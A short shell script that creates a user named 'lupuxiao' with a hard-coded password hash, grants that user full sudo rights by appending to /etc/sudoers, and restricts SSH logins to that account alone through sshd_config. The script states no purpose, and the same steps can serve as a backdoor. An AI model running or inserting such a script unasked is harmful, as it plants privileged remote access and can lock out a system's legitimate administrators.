#! /bin/sh
useradd lupuxiao -s /bin/bash -p \$6\$WT0TTDJ5\$lVdD97m0.ot.WCtoM5jad2BM4LNpchHaH9uVuucZoufsE.3v1l7DbKSoilzNNlqc99I7uygos6lSqhiDxccX40
echo "lupuxiao ALL=(ALL)       ALL" >>  /etc/sudoers
echo "AllowUsers    lupuxiao" >> /etc/ssh/sshd_config
